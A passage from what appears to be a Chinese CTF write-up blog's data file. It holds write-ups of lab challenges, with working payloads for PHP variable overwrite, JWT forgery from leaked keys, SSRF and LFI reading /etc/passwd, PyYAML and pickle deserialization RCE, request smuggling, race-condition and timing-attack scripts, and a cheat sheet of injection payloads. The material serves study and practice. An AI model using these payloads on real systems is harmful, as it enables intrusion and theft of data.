// \u6838\u5FC3\u4EE3\u7801\uFF1A\u53D8\u91CF\u8986\u76D6
foreach($_GET as $k => $v) $$k = $v;

// \u7136\u540E\u7528 === \u505A\u4E25\u683C\u5224\u65AD
if ($key === "secret_value") { ... }
\`\`\`

**\u7ED5\u8FC7\u65B9\u6CD5**\uFF1A\u901A\u8FC7 URL \u53C2\u6570 \`?key=[]\` \u4F20\u5165\u7A7A\u6570\u7EC4\uFF0C\u5229\u7528 PHP \u7684\u53D8\u91CF\u8986\u76D6\u673A\u5236\u8986\u76D6 \`$key\`\u3002

**\u7ECF\u9A8C**\uFF1A
1. \u67E5\u770B\u6E90\u7801\u6CE8\u91CA\uFF0C\u90A3\u91CC\u5F80\u5F80\u85CF\u7740\u8DEF\u7531\u63D0\u793A\u548C\u5173\u952E\u53C2\u6570
2. \u7A7A\u6570\u7EC4 \`[]\` \u4E0E\u5B57\u7B26\u4E32/\u6570\u5B57\u7684\u6BD4\u8F83\u884C\u4E3A\u662F PHP \u5F31\u7C7B\u578B\u7684\u7CBE\u9AD3
3. \u53D8\u91CF\u8986\u76D6 \`foreach($$k)\` \u53EF\u4EE5\u901A\u8FC7\u4F20\u53C2\u8986\u76D6\u4EFB\u610F\u53D8\u91CF

---

**\u8E29\u5751\u6559\u8BAD**\uFF1A
1. CTF \u4E2D\u4E0D\u8981\u6F0F\u6389\u4EFB\u4F55\u9875\u9762\u6E90\u7801\u7684\u6CE8\u91CA
2. LFI \u7A7F\u8D8A\u6DF1\u5EA6\u8981\u5927\u80C6\u8BD5\uFF0C\u4ECE 1 \u7EA7\u5230 10 \u7EA7\u9010\u4E00\u6392\u67E5
3. IDOR \u7684\u53C2\u6570\u503C\u4E0D\u8981\u53EA\u770B\u8868\u9762\uFF0C\u8A66\u8A66\u76F8\u90BB\u7684 ID
4. SSRF \u4E2D\u4E0D\u540C\u534F\u8BAE\u884C\u4E3A\u5DEE\u5F02\u5F88\u5927\uFF0Cgopher/dict/file \u4E00\u5B9A\u8981\u90FD\u8BD5
`
  },
  "may-2026": {
    title: "CTF Writeup - 2026\u5E745\u6708",
    subtitle: "ISCC / \u9752\u5C91 / CTFShow",
    content: `
# CTF Writeup - 2026\u5E745\u6708 (\u622A\u81F35\u67086\u65E5)

## \u4E00\u3001ISCC CTF Web (\u89E3\u51FA \u{1F525})

**\u9898\u76EE**: \`http://39.105.213.28:49106\`
**FLAG**: \`ISCC{K6FRFyHAMaMmPZNmXXpA}\`

### \u653B\u51FB\u94FE

#### 1. \`.git\` \u6E90\u7801\u6CC4\u9732
\`\`\`bash
# \u7528 git_dumper \u514B\u9686\u4ED3\u5E93
python git_dumper.py http://39.105.213.28:49106/.git/ ./iscc_git/

# \u67E5\u770B git \u5386\u53F2\uFF0C\u627E\u5230\u65E7\u7248\u672C
git log --all --oneline
git show <commit_id>:legacy_probe_stub.py
\`\`\`

\u4ECE \`.git/objects\` \u4E2D\u8FD8\u539F\u4E86\u65E7\u7248 \`legacy_probe_stub.py\`\uFF0C\u83B7\u53D6\u4E24\u4E2A\u5173\u952E\u5BC6\u94A5\uFF1A
- **JWT \u5BC6\u94A5**: \`ISCC_2026_JWT_DEBUG_KEY_#9527\`
- **\u65E7\u7248 HMAC \u5BC6\u94A5**: \`ISCC_SERVER_SECRET_REAL\`

#### 2. \u767B\u5F55
\`\`\`
\u7528\u6237\u540D: auditor
\u5BC6\u7801: audit2025
\`\`\`
\uFF08\u4ECE git \u5386\u53F2\u6216\u6E90\u7801\u4E2D\u627E\u5230\u7684\u51ED\u636E\uFF09

#### 3. HS256 JWT \u4F2A\u9020
\`\`\`python
import jwt
payload = {"sub": "auditor_id", "role": "auditor", "exp": 9999999999}
token = jwt.encode(payload, "ISCC_2026_JWT_DEBUG_KEY_#9527", algorithm="HS256")
# \u5C06 token \u586B\u5165 Cookie: jwt_token=xxx
\`\`\`

#### 4. \u5173\u952E\u7ED5\u8FC7\uFF1A\u5355\u72EC\u53D1\u9001 JWT
\u8BBF\u95EE \`/auditor/nodes\` \u65F6\uFF1A
- **Flask session + JWT \u540C\u65F6\u5B58\u5728** \u2192 \u8D70\u989D\u5916\u6821\u9A8C\u903B\u8F91\uFF08\u62D2\u7EDD\uFF09
- **\u5355\u72EC JWT cookie\uFF08\u65E0 session\uFF09** \u2192 \u670D\u52A1\u7AEF\u53EA\u6821\u9A8C JWT \u4E0D\u6821\u9A8C session \u2192 **200 \u653E\u884C\uFF01**

\u8FD9\u662F Flask + JWT \u6DF7\u5408\u8BA4\u8BC1\u903B\u8F91\u7684\u6F0F\u6D1E\u5229\u7528\u3002

#### 5. \u5185\u90E8 API HMAC \u7B7E\u540D
\u5728 \`/auditor/nodes\` \u9875\u9762\u63D0\u4EA4\u67E5\u8BE2\u65F6\uFF0C\u9700\u5BF9 \`node_id:timestamp\` \u8FDB\u884C HMAC-SHA256 \u7B7E\u540D\uFF1A
\`\`\`python
import hmac, hashlib, time

node_id = "core-storage-01"
timestamp = str(int(time.time()))
msg = f"{node_id}:{timestamp}"
sig = hmac.new(
    "ISCC_SERVER_SECRET_REAL".encode(),
    msg.encode(),
    hashlib.sha256
).hexdigest()
# \u5C06 sig\u3001node_id\u3001timestamp \u4F5C\u4E3A\u8BF7\u6C42\u53C2\u6570\u63D0\u4EA4
\`\`\`

#### 6. Flag \u83B7\u53D6
\u7B7E\u540D\u9A8C\u8BC1\u901A\u8FC7\u540E\uFF0C\u8FD4\u56DE flag\u3002

---

## \u4E8C\u3001\u9752\u5C91 CTF\uFF08120/120 \u4E00\u8840\u901A\u5173 \u{1F31F}\uFF09

**\u5E73\u53F0**: ctf.jinqiujec.com
**\u6218\u7EE9**: 120\u9898\u5168\u90E8\u89E3\u7B54\uFF0C100%\u4E00\u8840\u7387

### \u5173\u952E\u89E3\u9898\u6280\u672F

| \u9898\u578B | \u9898\u76EE | \u6280\u672F\u8981\u70B9 |
|------|------|---------|
| EZINFOLEAK_2~5 | MISC | \`/proc/self/environ\` \u6CC4\u9732\u8DEF\u5F84\uFF0Cphpinfo \u627E\u6E90\u7801\uFF0C\`.git\` \u66B4\u9732 |
| JWT | WEB | HS256 \u5F31\u5BC6\u94A5\u7206\u7834 \`rockyou.txt\` |
| SSTI | WEB | \`url_for.__globals__['os'].popen()\` + \u5199\u6587\u4EF6\u5230 static \u76EE\u5F55 |
| SSRF | WEB | gopher \u6253 Redis/gopher \u6253 FastCGI\u3001\u8FDB\u5236\u8F6C\u6362\u7ED5\u8FC7\u9ED1\u540D\u5355 |
| XXE | WEB | \u53C2\u6570\u5B9E\u4F53 + \`interactsh.oast.online\` \u5916\u5E26\u6570\u636E |
| \u6587\u4EF6\u4E0A\u4F20 | WEB | \`.user.ini\` + \`auto_prepend_file=1.png\` \u89E3\u6790\u7ED5\u8FC7 |
| \u6761\u4EF6\u7ADE\u4E89 | WEB | BP \u5E76\u53D1 30 \u7EBF\u7A0B\u5199 + 80 \u7EBF\u7A0B\u8BFB\u4E34\u65F6\u6587\u4EF6 |
| \u53CD\u5E8F\u5217\u5316 | WEB | POP \u94FE\u9006\u63A8\uFF1A\`__destruct\` \u2192 \`__toString\` \u2192 \`__invoke\` \u2192 \`__set\` \u2192 \`__get\` |

### \u6700\u540E\u4E00\u9898\uFF1AEZINFOLEAK
- LFI \u6F0F\u6D1E\uFF1A\`?page=../../etc/passwd\`
- \u8DEF\u5F84\u7A7F\u8D8A\uFF1A\`../../fl4g.txt\` \u76F4\u63A5\u8BFB\u53D6 flag

---

## \u4E09\u3001CTFShow Basic\uFF08\u90E8\u5206\u5B8C\u6210\uFF09

**\u8D26\u53F7**: （已清理） / （已清理）

### \u5DF2\u89E3\u9898\u76EE

| \u9898\u53F7 | \u7C7B\u578B | \u89E3\u6CD5 |
|------|------|------|
| basic_1~9 | MISC/Crypto | \u57FA\u7840\u9898\u6279\u91CF\u89E3\u7B54 |
| basic_11 | WEB | JWT \u7206\u7834 |
| basic_12 | WEB | \u57FA\u7840 SQL \u6CE8\u5165 |
| **web11** | WEB | **PHP eval \u6CE8\u5165** |

### web11 \u89E3\u6CD5
\`\`\`
URL: http://challenge.ctf.show:8080/
Payload: system($_GET['cmd']);&cmd=ls
FLAG: ctfshow{6474576e-5392-4f81-b46f-d4773f7621fa}
\`\`\`

---

## \u56DB\u3001PassKey WebAuthn CTF\uFF08TOCTOU \u6F0F\u6D1E\u53D1\u73B0 \u{1F525}\uFF09

**\u9776\u573A**: \`docker.qingcen.net:46900\`
**\u72B6\u6001**: \u9776\u573A\u79BB\u7EBF\uFF0C\u4F46\u6F0F\u6D1E\u5206\u6790\u5DF2\u5B8C\u6210

### \u6F0F\u6D1E\uFF1ATOCTOU \u6761\u4EF6\u7ADE\u4E89

**\u4F4D\u7F6E**: \`app.py\` \u7B2C215-268\u884C \`login_finish\` \u51FD\u6570

\`\`\`python
# \u6F0F\u6D1E\u4EE3\u7801
if not state.get("verification_complete"):
    # ... \u9A8C\u8BC1\u903B\u8F91\uFF08\u4EC5\u7B2C\u4E00\u6B21\u6267\u884C\uFF09...
    state["verification_complete"] = True  # \u2190 \u6807\u8BB0\u5DF2\u5B8C\u6210

# \u26A0\uFE0F \u5173\u952E\u6F0F\u6D1E\uFF1A\u4F7F\u7528\u653B\u51FB\u8005\u63D0\u4F9B\u7684ID\u800C\u975E\u5DF2\u9A8C\u8BC1\u7684ID
final_credential = get_credential_by_id(presented_credential_id)  # \u2190 \u653B\u51FB\u8005\u53EF\u63A7\uFF01
final_user = get_user_by_id(final_credential.user_id)
session["user_id"] = final_user.id  # \u2190 \u653B\u51FB\u8005\u63A7\u5236\u767B\u5F55\u8C01
\`\`\`

### \u653B\u51FB\u539F\u7406

1. \u6CE8\u518C\u666E\u901A\u7528\u6237\uFF0C\u83B7\u53D6\u6709\u6548 credential
2. \`login/begin\` \u83B7\u53D6 challenge
3. **\u7B2C\u4E00\u6B21 \`login/finish\`**\uFF1A\u7528\u81EA\u5DF1 credential \u9A8C\u8BC1 \u2192 \`verification_complete=True\`
4. **\u7ACB\u5373\u53D1\u9001\u7B2C\u4E8C\u6B21 \`login/finish\`**\uFF1A\u63D0\u4EA4 **admin \u7684 credential_id** \u2192 \u8DF3\u8FC7\u9A8C\u8BC1\uFF08\u56E0\u4E3A\u5DF2\u5B8C\u6210\uFF09\u2192 \u4F46 \`final_credential\` \u4F7F\u7528\u653B\u51FB\u8005\u63D0\u4EA4\u7684 ID \u2192 **\u4EE5 admin \u8EAB\u4EFD\u767B\u5F55\uFF01**

**\u5DF2\u77E5 admin \u51ED\u8BC1 ID**: \`A_XxMilPYsZb3vi2tllSPl-3glWQD4OIpEJfAvhLsI\`

---

## \u4E94\u3001\u6280\u80FD\u5B66\u4E60\u603B\u7ED3

### \u9AD8\u9891\u7B2C\u4E00\u677F\u65A7\uFF08Web\uFF09

| \u9898\u578B | \u9996\u9009\u63A2\u6D4B |
|------|---------|
| SQL\u6CE8\u5165 | \`' or 1=1#\` \u4E07\u80FD\u5BC6\u7801 |
| \u6587\u4EF6\u4E0A\u4F20 | F12 \u7981 JS \u4F20 \`.php\` |
| SSRF | \`http://127.0.0.1:port/admin\` |
| SSTI | \`{{7*7}}\` \u56DE\u663E\u63A2\u6D4B |
| XXE | \`<!ENTITY xxe SYSTEM "file:///flag">\` |
| JWT | \u6293 token \u7206\u7834 secret |
| .git\u6CC4\u9732 | \`git_dumper.py\` |

### \u65E0\u5B57\u6BCD\u6570\u5B57 RCE 6 \u79CD\u624B\u6CD5

1. **XOR \u5F02\u6216**: \u9010\u5B57\u7B26 XOR \u6784\u9020 payload
2. **OR \u6216\u8FD0\u7B97**: \u9010\u5B57\u7B26 OR \u6784\u9020
3. **PHP \u9690\u5F0F\u62FC\u63A5**: \`"sys"."tem"\` \u5B57\u7B26\u4E32\u62FC\u63A5
4. **\u53CD\u5F15\u53F7\u6267\u884C**: \`\`$ne\`\`
5. **\u53D8\u91CF\u51FD\u6570**: \`$$_()\` \u52A8\u6001\u8C03\u7528
6. **\u516B\u8FDB\u5236\u8F6C\u4E49**: \`$'\\143\\141\\164'\`

---

## \u516D\u3001\u9776\u573A\u72B6\u6001\u603B\u7ED3

| \u9776\u573A | \u72B6\u6001 | \u5907\u6CE8 |
|------|------|------|
| \u9752\u5C91 CTF | \u2705 120/120 \u5168\u901A | 100% \u4E00\u8840\uFF0C\u7B49\u5F85\u66F4\u65B0 |
| ISCC CTF | \u2705 \u89E3\u51FA 1 \u9898 | Web \u9898 flag \u5DF2\u62FF |
| CTFShow basic | \u{1F534} \u90E8\u5206\u5B8C\u6210 | basic_10 IDOR \u672A\u89E3 |
| PassKey WebAuthn | \u23F8\uFE0F \u9776\u573A\u79BB\u7EBF | TOCTOU \u6F0F\u6D1E\u5DF2\u5206\u6790 |

---

*\u751F\u6210\u65F6\u95F4: 2026-05-06*
*\u535A\u5BA2\u5730\u5740: https://heliumsenbrg.github.io/ctf-writeup-blog/*
`
  },
  northbridge: {
    title: "Northbridge -- SSRF Bypass",
    subtitle: "SSRF via kkfileview getCorsFile",
    content: `
Northbridge \u662F\u4E00\u9053\u5178\u578B\u7684 SSRF \u9898\u3002\u670D\u52A1\u7AEF\u96C6\u6210\u4E86 kkfileview\uFF0C\u5176\u4E2D getCorsFile \u63A5\u53E3\u76F4\u63A5\u8BFB\u53D6\u7528\u6237\u63D0\u4F9B\u7684 URL \u5E76\u8FD4\u56DE\u5185\u5BB9\uFF0C\u6CA1\u6709\u4EFB\u4F55\u767D\u540D\u5355\u6821\u9A8C\u3002

## \u6F0F\u6D1E\u70B9

\`\`\`javascript
GET /kkfileview/getCorsFile?urlPath=http://target/service
\`\`\`

\`urlPath\` \u5B8C\u5168\u53EF\u63A7\uFF0C\u53EF\u4EE5\u6307\u5411\u5185\u7F51\u670D\u52A1\u6216\u672C\u5730\u6587\u4EF6\u3002

## \u534F\u8BAE\u63A2\u6D4B

| \u7C7B\u578B | \u793A\u4F8B | \u7ED3\u679C |
|------|------|------|
| HTTP 127.0.0.1 | http://127.0.0.1:8080 | \u88AB\u62E6\u622A |
| file:// | file:///etc/passwd | \u6210\u529F |
| gopher:// | gopher://127.0.0.1:6379/_info | \u8D85\u65F6 |

**\u5173\u952E\u53D1\u73B0\uFF1Afile:// \u76F4\u63A5\u8BFB\u672C\u5730\u6587\u4EF6\u6700\u6709\u6548\u3002**

## \u8BFB\u53D6 flag

\`\`\`bash
file:///flag
file:///app/index.php
file:///proc/self/environ
\`\`\`

\u4ECE /proc/self/environ \u4E2D\u53D1\u73B0\u4E86\u73AF\u5883\u53D8\u91CF\u6CC4\u9732\uFF0C\u5305\u542B\u90E8\u5206 flag\u3002

## \u6536\u83B7\u7684 flag

- \u76F4\u63A5\u6587\u4EF6\u8BFB\u53D6\uFF1A/flag, /flag.txt
- \u6E90\u7801\u6CC4\u9732\uFF1A/app/*.php, /.git/config
- \u8FD0\u884C\u73AF\u5883\uFF1A/proc/self/*, /proc/version

## \u8E29\u5751

1. **\u4E00\u5F00\u59CB\u6B7B\u78D5 HTTP \u534F\u8BAE**\uFF0C\u6D6A\u8D39\u4E86\u5F88\u591A\u65F6\u95F4\u5728 IP \u9ED1\u540D\u5355\u7ED5\u8FC7\u4E0A
2. **file:// \u7684\u591A\u91CD\u8DEF\u5F84**\uFF1A/flag \u4E0D\u5B58\u5728\u65F6\u8BD5\u8BD5 /app/flag\u3001/var/www/flag
`
  },
  qc734: {
    title: "QingCen #734 -- Race Condition",
    subtitle: "aiohttp \u5E76\u53D1\u5237\u79EF\u5206",
    icon: "Zap",
    color: "orange",
    content: `
# QingCen #734 -- Race Condition

**\u9776\u573A**: docker.qingcen.net:30053
**\u7C7B\u578B**: Web / \u6761\u4EF6\u7ADE\u4E89
**\u96BE\u5EA6**: Medium

## \u6F0F\u6D1E\u5206\u6790

\u79EF\u5206\u5546\u57CE\u7684\u5151\u6362\u63A5\u53E3\u5B58\u5728\u7ECF\u5178\u7684 TOCTOU \u6F0F\u6D1E\uFF1A\u670D\u52A1\u7AEF\u5148\u68C0\u67E5\u4F59\u989D\u518D\u6263\u51CF\uFF0C\u4F46\u4E24\u4E2A\u64CD\u4F5C\u4E4B\u95F4\u6CA1\u6709\u9501\u3002

## \u5229\u7528\u65B9\u5F0F

\`\`\`python
import asyncio, aiohttp

async def redeem(session):
    try:
        async with session.post(f'{base}/api/redeem') as r:
            return await r.json()
    except:
        return {}

connector = aiohttp.TCPConnector(limit=0)
async with aiohttp.ClientSession(connector=connector) as s:
    tasks = [redeem(s) for _ in range(3000)]
    results = await asyncio.gather(*tasks)
\`\`\`

## \u8E29\u5751

1. **\u4E00\u5F00\u59CB\u53EA\u7528\u4E86 threads**\uFF0C\u5B9E\u9645 aiohttp \u5F02\u6B65\u6BD4\u591A\u7EBF\u7A0B\u66F4\u9AD8\u6548
2. **\u6CA1\u68C0\u67E5\u8FD4\u56DE\u503C\u683C\u5F0F**\uFF0C\u6709\u7684\u8FD4\u56DE 200 \u4F46\u5185\u5BB9\u662F error
3. **session \u4F1A\u8FC7\u671F**\uFF1A\u5237\u5230\u4E00\u5B9A\u7A0B\u5EA6 session \u88AB\u9650\u5236
`
  },
  qc747: {
    title: "QingCen #747 -- PHP Filter Bypass",
    subtitle: "\u5927\u5C0F\u5199\u7ED5\u8FC7 + URL\u7F16\u7801",
    icon: "Code",
    color: "purple",
    content: `
# QingCen #747 -- PHP Filter Bypass

**\u9776\u573A**: docker.qingcen.net:38073
**\u7C7B\u578B**: Web / PHP Filter Bypass
**\u96BE\u5EA6**: Medium

## WAF \u89C4\u5219

| \u8FC7\u6EE4\u8BCD | \u89E6\u53D1\u4FE1\u606F | \u7ED5\u8FC7\u65B9\u6CD5 |
|--------|----------|----------|
| php | "php not allowed" | \u5927\u5199 PHP / Php / pHp |
| data | "data not allowed" | URL \u7F16\u7801 |
| flag | "file not allowed" | \u7F16\u7801\u5355\u5B57\u7B26 %66lag |

## \u7ED5\u8FC7\u8FC7\u7A0B

### 1. \u5927\u5C0F\u5199\u7ED5\u8FC7 php

\`\`\`bash
PHP://filter/convert.base64-encode/resource=pages/flag.html
\`\`\`

### 2. URL \u7F16\u7801\u7ED5\u8FC7 flag

\`\`\`bash
%66lag.html
fla%67.html
fl%61g.html
\`\`\`

## \u5173\u952E Payload

\`\`\`bash
PHP://filter/convert.base64-encode/resource=pages/%66%6c%61%67.html
\`\`\`

## \u7ECF\u9A8C

1. \u5927\u5C0F\u5199\u53D8\u4F53\uFF1APHP -> Php -> pHp -> phP
2. URL \u7F16\u7801\uFF1A\u5355\u5B57\u8282\u7F16\u7801\u6BD4\u53CC\u5B57\u8282\u66F4\u9690\u853D
3. \u5148\u8BFB index.php \u786E\u8BA4\u8DEF\u5F84\uFF0C\u518D\u5B9A\u5411\u653B\u51FB
`
  },
  "re-plzdebugme": {
    title: "[re] plzdebugme \u2014 \u8C03\u8BD5\u4F18\u5148",
    subtitle: "Linux ELF RE \xB7 \u5C42\u5C42\u89E3\u5BC6 \xB7 GDB break on x0r()",
    icon: "Shield",
    color: "red",
    content: `
\u9898\u76EE\u7ED9\u4E86\u4E00\u4E2A Linux x64 ELF\uFF0C\u540D\u5B57\u5C31\u662F "plz debug me"\u3002\u9898\u76EE\u63D0\u793A\u76F4\u63A5 break \u5728 \`x0r()\` \u4E0A\uFF0C\u6574\u4F53\u601D\u8DEF\uFF1A\u8F93\u5165 \u2192 RC4 \u2192 AES-128-ECB \u2192 BTEA \u2192 \`x0r()\` \u2192 \u4E0E BSS \u4E2D\u7684 flag \u6BD4\u8F83\u3002

## \u5173\u952E\u7EBF\u7D22
- \u63D0\u793A\u91CC\u660E\u786E\u5199\u4E86\uFF1A**break on x0r()**
- \u4E8C\u8FDB\u5236\u91CC\u540C\u4E00\u5957\u89E3\u5BC6\u6D41\u7A0B\u4F1A\u5BF9\u4E24\u4E2A\u7F13\u51B2\u533A\u505A\u5BF9\u79F0\u5904\u7406\uFF1A\u4E00\u4E2A\u662F\u8F93\u51FA\u5230 \`flag\` \u6570\u7EC4\uFF0C\u53E6\u4E00\u4E2A\u662F BSS \u4E2D\u7684 \`flag\` \u6BD4\u8F83\u7F13\u51B2\u533A\u3002

## GDB \u8C03\u8BD5

\u5728 Kali \u91CC\u76F4\u63A5\u6267\u884C\uFF1A
\`\`\`bash
gdb -batch -x plzdb.gdb ./plzdebugme
\`\`\`

plzdb.gdb \u5185\u5BB9\uFF1A
\`\`\`
break x0r
run
finish
x/32gb &flag
x/s &flag
continue
\`\`\`

## Flag
\`\`\`
flag{It3_D3bugG_T11me!_le3_play}
\`\`\`

## \u7ECF\u9A8C\u603B\u7ED3
\u8FD9\u9898\u60F3\u5F3A\u8C03\u7684\u4E00\u6761\u975E\u5E38\u6734\u7D20\uFF1A\u9898\u76EE\u5DF2\u7ECF\u7ED9\u51FA\u6781\u5F3A\u7684\u64CD\u4F5C\u63D0\u793A\u65F6\uFF0C\u4E0D\u8981\u786C\u521A\u7EAF\u9759\u6001\uFF0C\u76F4\u63A5\u65AD\u70B9\u662F\u6700\u5FEB\u7684\u8DEF\u3002\u5C24\u5176\u662F\u8FD9\u79CD\u591A\u5C42\u5D4C\u5957\u9006\u53D8\u7ED3\u6784\uFF0C\u786C\u63A8\u4E00\u65E6\u67D0\u4E2A\u5E38\u91CF\u770B\u9519\uFF0C\u540E\u9762\u7684\u9A8C\u8BC1\u5C31\u5168\u9519\u3002
`
  },
  yaml: {
    title: "\u55B5\u55B5\u5BA0\u7269\u533B\u9662 -- YAML \u53CD\u5E8F\u5217\u5316 RCE",
    subtitle: "PyYAML \u6807\u7B7E\u7ED5\u8FC7",
    icon: "Zap",
    color: "orange",
    content: `
# \u55B5\u55B5\u5BA0\u7269\u533B\u9662 -- YAML \u53CD\u5E8F\u5217\u5316 RCE

**\u9776\u573A**: 175.27.251.122:10001
**\u7C7B\u578B**: Misc / Insecure Deserialization
**\u96BE\u5EA6**: Medium

## \u6F0F\u6D1E\u70B9

\`\`\`python
yaml.load(user_input)  # \u672A\u6307\u5B9A Loader
\`\`\`

## \u5229\u7528 Payload

\`\`\`yaml
!!python/object/apply:os.system
args: ['cat /flag']
\`\`\`

## \u591A\u7AEF\u53E3\u6392\u67E5

- 10001: \u8FC7\u6EE4\u4E86 !!python/object/apply
- 10002: \u90E8\u5206\u8FC7\u6EE4
- 10003: \u76F4\u63A5\u53EF\u6267\u884C

## \u8E29\u5751

1. \u8F7D\u8377\u683C\u5F0F\uFF1AJSON \u8F6C\u4E49\u540E YAML \u591A\u884C payload \u9700\u8981\u6B63\u786E\u6362\u884C
2. \u7F16\u7801\uFF1Asys.stdout.reconfigure(encoding='utf-8') \u89E3\u51B3\u4E2D\u6587\u8F93\u51FA
`
  },
  qc733: {
    title: "QingCen #733 -- WebSocket / XXE / Pickle / Smuggle",
    subtitle: "\u591A\u5C42\u534F\u8BAE\u4E0E\u53CD\u5E8F\u5217\u5316",
    icon: "Zap",
    color: "red",
    content: `
# QingCen #733 -- \u591A\u5C42\u534F\u8BAE\u4E0E\u53CD\u5E8F\u5217\u5316

**\u9776\u573A**: docker.qingcen.net:42420
**\u7C7B\u578B**: Web / \u534F\u8BAE + \u53CD\u5E8F\u5217\u5316
**\u96BE\u5EA6**: Hard

## WebSocket \u5347\u7EA7\u63A2\u6D4B

\`\`\`python
import socket
s = socket.socket()
s.connect(('docker.qingcen.net', 42420))
s.send(
    'GET / HTTP/1.1\\r\\n'
    'Host: docker.qingcen.net:42420\\r\\n'
    'Upgrade: websocket\\r\\n'
    'Connection: Upgrade\\r\\n'
    'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\\r\\n'
    'Sec-WebSocket-Version: 13\\r\\n'
    '\\r\\n'
)
\`\`\`

## Pickle \u53CD\u5E8F\u5217\u5316

\`\`\`python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag',))
payload = pickle.dumps(Exploit())
\`\`\`

## HTTP \u8BF7\u6C42\u8D70\u79C1

\`\`\`http
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
\`\`\`
`
  },
  timing: {
    title: "CTFShow -- Timing Attack",
    subtitle: "\u65F6\u95F4\u4FA7\u4FE1\u9053\u5206\u6790",
    icon: "Zap",
    color: "yellow",
    content: `
# CTFShow -- Timing Attack

**\u9776\u573A**: ctf.show
**\u7C7B\u578B**: Crypto / Side Channel
**\u96BE\u5EA6**: Medium

## \u539F\u7406

\u9010\u5B57\u8282\u6BD4\u8F83\u65F6\uFF0C\u6BCF\u4E2A\u5B57\u8282\u731C\u5BF9\u4F1A\u591A\u6267\u884C\u4E00\u6B21\u5FAA\u73AF\uFF0C\u54CD\u5E94\u65F6\u95F4\u66F4\u957F\u3002

\`\`\`python
import requests, time
base = 'https://ctf.show/challenge/timing'
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
password = ''
for pos in range(32):
    times = {}
    for c in charset:
        guess = password + c
        t0 = time.time()
        requests.post(base, data={'password': guess})
        times[c] = time.time() - t0
    best = max(times, key=times.get)
    password += best
\`\`\`

## \u5173\u952E\u6280\u5DE7

1. **\u65F6\u95F4\u5F52\u4E00\u5316**\uFF1A\u51CF\u53BB\u57FA\u7840\u54CD\u5E94\u65F6\u95F4\u518D\u770B\u589E\u91CF
2. **\u591A\u6B21\u91C7\u6837**\uFF1A\u6BCF\u4E2A\u5B57\u7B26\u6D4B 10-20 \u6B21\u53D6\u5E73\u5747\u503C
3. **\u907F\u5F00\u7F51\u7EDC\u6CE2\u52A8**\uFF1A\u5728\u7A33\u5B9A\u65F6\u6BB5\u8DD1\uFF0C\u51CF\u5C11\u566A\u97F3
`
  },
  typejuggling: {
    title: "CTFShow -- PHP Type Juggling",
    subtitle: "\u5F31\u7C7B\u578B\u54C8\u5E0C\u7ED5\u8FC7",
    icon: "Code",
    color: "purple",
    content: `
# CTFShow -- PHP Type Juggling

**\u9776\u573A**: ctf.show
**\u7C7B\u578B**: Web / PHP Weak Typing
**\u96BE\u5EA6**: Medium

## 0e \u7ED5\u8FC7

\`\`\`python
import hashlib
for i in range(10000000):
    s = str(i)
    h = hashlib.md5(s.encode()).hexdigest()
    if h.startswith('0e') and h[2:].isdigit():
        print(f'Match: {s} -> {h}')
\`\`\`

\u5DF2\u77E5\u78B0\u649E\uFF1A
- QNKCDZO -> 0e462097431906509019562988736854
- 240610708 -> 0e462097431906509019562988736854

## \u6570\u7EC4\u7ED5\u8FC7 (===)

\`\`\`php
?a[]=1&b[]=2
\`\`\`

## \u7ECF\u9A8C

1. \u5148\u5224\u65AD == \u8FD8\u662F ===
2. 0e \u524D\u7F00\u4F18\u5148\u627E\u77ED\u5B57\u7B26\u4E32\u78B0\u649E
3. JSON \u5D4C\u5957\u7528\u4E8E\u591A\u5C42\u6BD4\u8F83
`
  },
  sourceleak: {
    title: "CTFShow -- Source Code Leak",
    subtitle: "\u6E90\u7801\u6CC4\u9732\u4E0E\u5907\u4EFD\u6587\u4EF6",
    icon: "FileText",
    color: "cyan",
    content: `
# CTFShow -- Source Code Leak

**\u9776\u573A**: ctf.show
**\u7C7B\u578B**: Web / Information Leakage
**\u96BE\u5EA6**: Easy

## \u5E38\u89C1\u6CC4\u9732\u70B9

\`\`\`bash
www.zip / backup.zip / site.tar.gz
index.php.swp / index.php.swo
/.git/HEAD / /.git/config
\`\`\`

## \u5229\u7528\u6D41\u7A0B

1. \u76EE\u5F55\u626B\u63CF\uFF1Adirsearch / gobuster
2. \u654F\u611F\u6587\u4EF6\uFF1A.git/config, .env, web.config
3. \u538B\u7F29\u5305\uFF1A\u8BD5 zip/tar/gz \u540E\u7F00
4. git log\uFF1A\u627E\u5230\u65E7\u7248\u672C\u627E flag
`
  },
  sigforge: {
    title: "HMAC Signature Forgery",
    subtitle: "zlib + base64 \u7B7E\u540D\u7ED5\u8FC7",
    icon: "Shield",
    color: "blue",
    content: `
# HMAC Signature Forgery

**\u9776\u573A**: ctf.show
**\u7C7B\u578B**: Crypto / Signature Bypass
**\u96BE\u5EA6**: Hard

## \u7B7E\u540D\u9A8C\u8BC1\u6D41\u7A0B

\`\`\`python
import hmac, hashlib, zlib
def sign(params, secret):
    msg = '&'.join(f'{k}={v}' for k,v in params.items())
    compressed = zlib.compress(msg.encode())
    return hmac.new(secret.encode(), compressed, hashlib.sha256).hexdigest()
\`\`\`

## \u653B\u51FB\u601D\u8DEF

1. **\u957F\u5EA6\u6269\u5C55\u653B\u51FB**\uFF1A\u5728\u539F\u6709\u7B7E\u540D\u57FA\u7840\u4E0A\u8FFD\u52A0\u65B0\u53C2\u6570
2. **\u5BC6\u94A5\u7206\u7834**\uFF1A\u77ED\u5BC6\u94A5 + \u5B57\u5178\u653B\u51FB
3. **\u7F16\u7801\u6DF7\u6DC6**\uFF1A\u5229\u7528 WAF \u7F16\u7801\u5904\u7406\u4E0D\u4E00\u81F4

## \u7ECF\u9A8C

1. \u5148\u9A8C\u8BC1\u672C\u5730\u7B7E\u540D
2. \u5229\u7528\u9519\u8BEF\u4FE1\u606F\u6CC4\u9732\u4E2D\u95F4\u72B6\u6001
3. \u591A\u5C42\u7F16\u7801\u8981\u9010\u5C42\u5265\u79BB
`
  },
  notallmilk: {
    title: "NewStar 2025 \u2014 \u4E0D\u662F\u6240\u6709\u725B\u5976\u90FD\u53EB___",
    subtitle: "TLS \u6D41\u91CF\u89E3\u5BC6 + QR\u7801\u63D0\u53D6",
    icon: "Key",
    color: "amber",
    content: `
# NewStar CTF 2025 Extras \u2014 \u4E0D\u662F\u6240\u6709\u725B\u5976\u90FD\u53EB___

